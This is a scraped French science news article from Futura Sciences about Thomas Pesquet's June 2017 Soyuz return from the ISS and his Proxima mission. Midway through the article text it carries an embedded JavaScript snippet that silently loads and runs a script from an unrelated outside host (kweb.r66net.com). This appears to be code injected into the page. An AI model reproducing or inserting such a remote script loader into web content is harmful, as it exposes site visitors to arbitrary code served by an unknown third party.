{"title": "En direct, suivez le retour sur Terre de Thomas Pesquet", "newspaper": "Futura Sciences", "author": ["Jean-Luc Goudet"], "date_publi": "2017-06-02", "content": "Cet apres-midi, a 16 h 10 (heure francaise), une capsule Soyouz deposera dans les plaines du Kazakhstan Thomas Pesquet et Oleg Novitskiy, apres trois heures et demie de voyage... et six mois d'orbites autour de la Terre. Vivez ces moments en direct grace a la retransmission du Cnes. C'est par ici. Le mediatique  astronaute  de l' ESA , Thomas Pesquet, termine aujourd'hui son travail dans l' ISS . A 9 h 00, ce vendredi matin, lui et son collegue russe Oleg Novitskiy ont dit au revoir a leurs quatre compagnons et ont pris place dans un vaisseau  Soyouz . Le desarrimage est prevu a partir de 12 h 30 (heure francaise). A 12 h 50, le vaisseau Soyouz s'eloignera lentement de la Station spatiale avant d'allumer brievement ses  propulseurs . La phase de rentree proprement dite debutera a 14 h 45. Il faudra ensuite environ trois heures pour traverser l' atmosphere . Le module central du vaisseau Soyouz, dans lequel se trouvent les astronautes, se separera du reste et poursuivra la descente, protege par son bouclier thermique. Le premier  parachute  s'ouvrira a 8.500 m d'altitude et la capsule, apres un bref allumage des retrofusees, se posera << en douceur >> sur une vaste plaine du Kazakhstan. Tous les astronautes qui ont vecu l'experience trouvent que le terme est un gentil euphemisme. Les 4 G de deceleration, les secousses au moment de la separation de differents elements et le contact avec le sol, sans oublier les  turbulences  durant toutes les autres phases laissent apparemment des souvenirs imperissables. Pour vivre toutes ces operations en direct, rendez-vous ici meme de 12 h 30 a 17 h 15. Le direct de la retransmission. (c) ESA Thomas Pesquet a participe a 117 experiences La mission  Proxima  a ete confiee par l'ESA, l'Agence spatiale europeenne, a Thomas Pesquet, dont c'etait le premier sejour dans l'espace. Ingenieur de vol pour cette mission, pendant les Expeditions 50 et 51, il a realise 62 experiences, mises au point par l'ESA et le Cnes (Centre national d'exploration spatiale). Plusieurs d'entre elles concernent la biologie et la medecine, notamment pour realiser des  echographies  a distance ou pour etudier le travail du  cerveau  en micropesanteur. D'autres touchaient a la  physique  des fluides et la croissance de  bacteries . L'astronaute francais a aussi participe a 55 autres experiences, programmees par les autres agences spatiales.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Futura a suivi ces travaux tout au long de ces six mois, mais Thomas Pesquet a su faire parler lui-meme de son travail, avec des images, des quiz et de nombreuses interventions (organisees par une equipe specialisee car l'astronaute avait de nombreuses taches a accomplir). Retrouvez nos articles sur Proxima, a lire durant la descente vers la  Terre  du module Soyouz... Voir aussi : Mission Proxima : Thomas Pesquet se prepare a redescendre sur Terre Le 2 juin 2017, a 16 h 09 (heure francaise), la capsule Soyouz touche le sol. Oleg Novitskiy et Tomas Pesquet sont arrives.                               Le saviez-vous ? Le choix du nom de cette mission a fait l'objet d'un concours public organise par l'ESA, debut 2015, qui a recueilli plus de 1.300 propositions. C'est celle de Samuel Planas, un adolescent de 13 ans, << Proxima >>, donc, qui a finalement ete retenue. << A cause de sa proximite, on a souvent presente  Proxima Centauri  comme la destination la plus logique pour un premier voyage interstellaire,  a explique Samuel,  mais Proxima rime aussi avec proximite et evoque l'idee que les vols habites ont des retombees directes pour les gens sur Terre. >> ", "theme": "sciences"}